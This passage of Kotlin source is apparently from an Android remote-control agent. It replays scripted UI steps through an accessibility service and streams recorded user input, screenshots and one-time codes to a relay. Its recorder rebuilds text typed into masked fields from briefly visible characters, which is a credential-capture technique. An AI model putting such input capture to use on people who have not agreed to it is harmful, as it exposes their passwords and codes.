                    requireActivity = step.requireActivity
                )
                if (!result.ok) {
                    return StepResult("failed", result.detail)
                }
                stepDetail = result.detail
                delay(400)
            }
            "scroll" -> {
                val selector = step.selector
                    ?: return StepResult("failed", "scroll requires selector")
                if (!service.scrollSelector(selector, step.dir != "up")) {
                    return StepResult("failed", "scroll failed")
                }
                delay(500)
            }
            "globalAction" -> {
                val name = step.name
                    ?: return StepResult("failed", "globalAction requires name")
                if (!service.performGlobalActionByName(name)) {
                    return StepResult("failed", "global action failed")
                }
                delay(500)
            }
            "screenshot" -> Unit
            "assert" -> {
                val selector = step.selector
                    ?: return StepResult("failed", "assert requires selector")
                if (!service.exists(selector)) return StepResult("failed", "assert failed")
            }
            "sleep" -> delay(step.ms)
            else -> return StepResult("failed", "unknown op: ${step.op}")
        }

        if (step.expect != null) {
            delay(300)
            if (!service.exists(step.expect)) {
                return StepResult("unverified", "expect not met", stepDetail)
            }
        }

        return StepResult("ok", detail = stepDetail)
    }

    private suspend fun waitForSelector(
        service: RcAccessibilityService,
        selector: Selector,
        timeoutMs: Long
    ): Boolean {
        val started = SystemClock.elapsedRealtime()
        while (SystemClock.elapsedRealtime() - started < timeoutMs) {
            if (service.exists(selector)) return true
            delay(250)
        }
        return service.exists(selector)
    }

    private suspend fun awaitOtp(timeoutMs: Long): String? {
        val started = SystemClock.elapsedRealtime()
        while (SystemClock.elapsedRealtime() - started < timeoutMs) {
            OtpBuffer.take()?.let { return it }
            delay(500)
        }

        val promptId = UUID.randomUUID().toString()
        val deferred = CompletableDeferred<String>()
        promptDeferred[promptId] = deferred
        socket?.send(
            JSONObject()
                .put("t", "prompt")
                .put("runId", currentRunId ?: "")
                .put("promptId", promptId)
                .put("kind", "otp")
                .put("message", "Enter the OTP")
                .toString()
        )
        val value = withTimeoutOrNull(120_000L) { deferred.await() }
        promptDeferred.remove(promptId)
        return value?.trim()?.takeIf { it.isNotEmpty() }
    }

    private suspend fun captureForReport(step: Step): Snapshot? {
        return when (step.op) {
            "waitFor", "waitForIdle", "waitForOtp", "sleep" -> null
            else -> {
                if (step.secretRef != null || step.secret) return null
                try {
                    service().captureSnapshot()
                } catch (_: Throwable) {
                    null
                }
            }
        }
    }

    private fun parseStep(json: JSONObject?, params: JSONObject): Step {
        val obj = json ?: JSONObject()
        return Step(
            op = obj.optString("op"),
            pkg = resolve(obj.optString("package").takeIf { it.isNotBlank() }, params),
            selector = parseSelector(obj.optJSONObject("selector"), params),
            selectors = obj.optJSONArray("selectors")?.let { array ->
                (0 until array.length())
                    .mapNotNull { parseSelector(array.optJSONObject(it), params) }
                    .takeIf { it.isNotEmpty() }
            },
            text = resolve(obj.optString("text").takeIf { it.isNotBlank() }, params),
            timeoutMs = obj.optLong("timeoutMs", 5000L),
            expect = parseSelector(obj.optJSONObject("expect"), params),
            optional = obj.optBoolean("optional", false),
            dir = obj.optString("dir").takeIf { it.isNotBlank() },
            name = resolve(obj.optString("name").takeIf { it.isNotBlank() }, params),
            label = resolve(obj.optString("label").takeIf { it.isNotBlank() }, params),
            ms = obj.optLong("ms", 500L),
            secretRef = obj.optString("secretRef").takeIf { it.isNotBlank() },
            secret = obj.optBoolean("secret", false),
            submit = obj.optBoolean("submit", true),
            pinMethod = obj.optString("pinMethod", "gesture"),
            requireActivity = resolve(
                obj.optString("requireActivity").takeIf { it.isNotBlank() },
                params
            )
        )
    }

    private fun parseSelector(json: JSONObject?, params: JSONObject): Selector? {
        if (json == null) return null
        val indexText = resolve(
            json.optString("index").takeIf { it.isNotBlank() },
            params
        )
        val selector = Selector(
            viewId = json.optString("viewId").takeIf { it.isNotBlank() },
            text = resolve(json.optString("text").takeIf { it.isNotBlank() }, params),
            contains = resolve(json.optString("contains").takeIf { it.isNotBlank() }, params),
            desc = resolve(json.optString("desc").takeIf { it.isNotBlank() }, params),
            descContains = resolve(
                json.optString("descContains").takeIf { it.isNotBlank() },
                params
            ),
            hint = resolve(json.optString("hint").takeIf { it.isNotBlank() }, params),
            hintContains = resolve(
                json.optString("hintContains").takeIf { it.isNotBlank() },
                params
            ),
            focused = if (json.has("focused")) json.optBoolean("focused") else null,
            editable = if (json.has("editable")) json.optBoolean("editable") else null,
            className = json.optString("className").takeIf { it.isNotBlank() },
            index = indexText?.toIntOrNull()?.coerceAtLeast(1) ?: 1,
            ignoreCase = json.optBoolean("ignoreCase", false)
        )
        return if (selector == Selector()) null else selector
    }

    private fun resolve(value: String?, params: JSONObject): String? {
        var result = value ?: return null
        for ((key, replacement) in runVars) {
            result = result.replace("{{$key}}", replacement)
        }
        val keys = params.keys()
        while (keys.hasNext()) {
            val key = keys.next()
            result = result.replace("{{$key}}", params.optString(key, ""))
        }
        return result
    }

    private fun sendRunStep(
        runId: String,
        index: Int,
        step: Step,
        status: String,
        ms: Long,
        error: String?,
        detail: String?,
        snapshot: Snapshot?
    ) {
        val payload = JSONObject()
            .put("i", index)
            .put("op", step.op)
            .put("status", status)
            .put("ms", ms)
            .put("error", error ?: JSONObject.NULL)
            .put("detail", detail ?: JSONObject.NULL)
            .put("label", step.label ?: JSONObject.NULL)
        if (snapshot != null) payload.put("snapshot", snapshotJson(snapshot))
        socket?.send(
            JSONObject()
                .put("t", "runStep")
                .put("runId", runId)
                .put("step", payload)
                .toString()
        )
    }

    // -----------------------------------------------------------------
    // Recorder
    // -----------------------------------------------------------------

    fun onRecordEvent(event: AccessibilityEvent) {
        if (!recording) return

        val type = when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> "text"
            AccessibilityEvent.TYPE_VIEW_CLICKED -> "tap"
            AccessibilityEvent.TYPE_VIEW_SCROLLED -> "scroll"
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> "window"
            else -> return
        }

        val app = event.packageName?.toString()
        val target = recordAppPackage
        if (target != null && app != null) {
            if (relatedPackage(app, target)) {
                appEntered = true
            } else if (
                type == "window" &&
                appEntered &&
                !ignoredForStop(app)
            ) {
                // The user left the app (home, another app, close): save and stop.
                autoStopRecording()
                return
            }
        }

        val activity = event.className?.toString()
        val source = try {
            event.source
        } catch (_: Throwable) {
            null
        }
        val sourceId = try {
            source?.viewIdResourceName
        } catch (_: Throwable) {
            null
        }
        val sourceClass = try {
            source?.className?.toString()
        } catch (_: Throwable) {
            null
        }

        // The keyboard window is noise for a "what did the user type" feed.
        if (type == "window" &&
            (app?.contains("inputmethod") == true || app?.contains("keyboard") == true)
        ) {
            return
        }

        val payload = JSONObject()
            .put("ts", System.currentTimeMillis())
            .put("type", type)
            .put("app", app ?: JSONObject.NULL)
            .put("appLabel", resolveAppLabel(app) ?: JSONObject.NULL)
            .put("activity", activity ?: JSONObject.NULL)
            .put("viewId", sourceId ?: JSONObject.NULL)
            .put("className", sourceClass ?: JSONObject.NULL)

        when (type) {
            "text" -> {
                val key = "${event.windowId}:${event.className}:${sourceId ?: ""}"
                val current = event.text?.joinToString("") ?: ""

                if (event.isPassword) {
                    payload.put("redacted", true)
                    payload.put("masked", false)
                    payload.put("text", JSONObject.NULL)
                    payload.put("delta", JSONObject.NULL)
                    payload.put("before", JSONObject.NULL)
                } else {
                    val masked = current.any { it in MASK_CHARS }
                    if (masked) {
                        val visible = current.filterNot { it in MASK_CHARS }
                        val typedSoFar = maskedTyped[key] ?: ""
                        val previousVisible = maskedVisible[key] ?: ""
                        val appended = when {
                            visible.isEmpty() -> ""
                            typedSoFar.endsWith(visible) -> ""
                            visible.startsWith(previousVisible) &&
                                typedSoFar.endsWith(previousVisible) ->
                                visible.substring(previousVisible.length)
                            visible.length == 1 -> visible
                            else -> visible
                        }
                        val next = typedSoFar + appended
                        maskedVisible[key] = visible
                        maskedTyped[key] = next
                        lastTexts[key] = next
                        payload.put("text", next)
                        payload.put("delta", appended)
                        payload.put("before", typedSoFar)
                        payload.put("masked", true)
                        payload.put("redacted", false)
                    } else {
                        val previous = lastTexts[key]
                        val delta = when {
                            previous == null -> current
                            current.startsWith(previous) -> current.substring(previous.length)
                            previous.startsWith(current) -> ""
                            else -> current
                        }
                        lastTexts[key] = current
                        maskedTyped[key] = current
                        maskedVisible[key] = current
                        payload.put("text", current)
                        payload.put("delta", delta)
                        payload.put("before", previous ?: JSONObject.NULL)
                        payload.put("masked", false)
                        payload.put("redacted", false)
                    }
                }
            }
            "tap" -> {
                val label = event.text?.firstOrNull()?.toString()
                    ?: event.contentDescription?.toString()
                payload.put("label", label ?: JSONObject.NULL)
            }
            "scroll" -> {
                val deltaY = try {
                    event.scrollDeltaY
                } catch (_: Throwable) {
                    0
                }
                payload.put("deltaY", deltaY)
            }
            "window" -> Unit
        }

        socket?.send(
            JSONObject()
                .put("t", "recordEvent")
                .put("event", payload)
                .apply {
                    currentSessionId?.let { put("sessionId", it) }
                }
                .toString()
        )
    }

    private fun sendRecordingState(recording: Boolean, sessionId: String?) {
        val message = JSONObject()
            .put("t", "recordingState")
            .put("recording", recording)
        if (sessionId != null) message.put("sessionId", sessionId)
        socket?.send(message.toString())
    }

    private fun relatedPackage(pkg: String, target: String): Boolean {
        if (pkg == target) return true
        if (pkg.startsWith(target) || target.startsWith(pkg)) return true
        if (pkg.contains("settings") && target.contains("settings")) return true
        return false
    }

    private fun ignoredForStop(pkg: String): Boolean {
        val lower = pkg.lowercase()
        return lower.contains("inputmethod") ||
            lower.contains("keyboard") ||
            lower.contains("permissioncontroller") ||
            lower.contains("documentsui") ||
            lower.contains("intentresolver") ||
            pkg == "com.android.systemui" ||
            pkg == "android" ||
            pkg == "com.acme.rc"
    }

    private fun autoStopRecording() {
        if (!recording) return
        val sessionId = currentSessionId
        recording = false
        currentSessionId = null
        recordAppPackage = null
        appEntered = false
        sendRecordingState(false, sessionId)
    }

    private fun resolveAppLabel(pkg: String?): String? {
        if (pkg.isNullOrBlank()) return null
        return try {
            val info = packageManager.getApplicationInfo(pkg, 0)
            packageManager.getApplicationLabel(info).toString()
        } catch (_: Throwable) {
            null
        }
    }

    // -----------------------------------------------------------------
    // JSON
    // -----------------------------------------------------------------

    private fun appJson(app: AppInfo): JSONObject = JSONObject()
        .put("pkg", app.packageName)
        .put("label", app.label)
        .put("version", app.versionName)
        .put("code", app.versionCode)
        .put("system", app.isSystem)

    private fun snapshotJson(snapshot: Snapshot): JSONObject {
        val elements = JSONArray()
        for (element in snapshot.elements) {
            val bounds = JSONArray()
                .put(element.boundsNorm.left.toDouble())
                .put(element.boundsNorm.top.toDouble())
                .put(element.boundsNorm.right.toDouble())
                .put(element.boundsNorm.bottom.toDouble())
            val actions = JSONArray()
            for (action in element.actions) actions.put(action)
            elements.put(
                JSONObject()
                    .put("i", element.index)
                    .put("id", element.id)
                    .put("b", bounds)
                    .put("text", element.text ?: JSONObject.NULL)
                    .put("desc", element.desc ?: JSONObject.NULL)
                    .put("vid", element.viewId ?: JSONObject.NULL)
                    .put("cls", element.className)
                    .put("acts", actions)
                    .put("editable", element.editable)
                    .put("scrollable", element.scrollable)
                    .put("clickable", element.clickable)
            )
        }

        return JSONObject()
            .put("t", "snapshot")
            .put("id", snapshot.id)
            .put("ts", snapshot.capturedAt)
            .put("w", snapshot.width)
            .put("h", snapshot.height)
            .put("rotation", snapshot.rotation)
            .put("pkg", snapshot.packageName ?: JSONObject.NULL)
            .put("activity", snapshot.activityName ?: JSONObject.NULL)
            .put("image", imageBase64(snapshot.bitmap))
            .put("elements", elements)
            .put("nodeCount", snapshot.nodeCount)
            .put("maxDepth", snapshot.maxDepth)
            .put("elapsedMs", snapshot.elapsedMs)
            .put("error", snapshot.error ?: JSONObject.NULL)
    }

    private fun imageBase64(bitmap: Bitmap?): String {
        if (bitmap == null) return ""
        return try {
            val out = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.WEBP_LOSSY, 75, out)
            Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
        } catch (t: Throwable) {
            Log.w(TAG, "imageBase64", t)
            ""
        }
    }

    // -----------------------------------------------------------------
    // Notification
    // -----------------------------------------------------------------

    private fun createChannel() {
        val manager = getSystemService(NotificationManager::class.java)
        val channel = NotificationChannel(
            CHANNEL_ID,
            "RC Agent relay",
            NotificationManager.IMPORTANCE_LOW
        ).apply {
            description = "Keeps RC Agent connected to the relay"
        }
        manager.createNotificationChannel(channel)
    }

    private fun buildNotification(text: String): Notification {
        val openIntent = PendingIntent.getActivity(
            this,
            0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        val stopIntent = PendingIntent.getService(
            this,
            1,
            Intent(this, AgentService::class.java).setAction(ACTION_STOP),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("RC Agent")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.stat_sys_upload)
            .setContentIntent(openIntent)
            .setOngoing(true)
            .addAction(0, "Stop", stopIntent)
            .build()
    }

    private fun startForegroundCompat(text: String) {
        val type = if (Build.VERSION.SDK_INT >= 34) {
            ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
        } else {
            0
        }
        try {
            ServiceCompat.startForeground(
                this,
                NOTIFICATION_ID,
                buildNotification(text),
                type
            )
        } catch (t: Throwable) {
            Log.w(TAG, "startForeground failed", t)
        }
    }

    private fun updateNotification(text: String) {
        try {
            NotificationManagerCompat.from(this)
                .notify(NOTIFICATION_ID, buildNotification(text))
        } catch (t: Throwable) {
            Log.w(TAG, "notify failed", t)
        }
    }
}
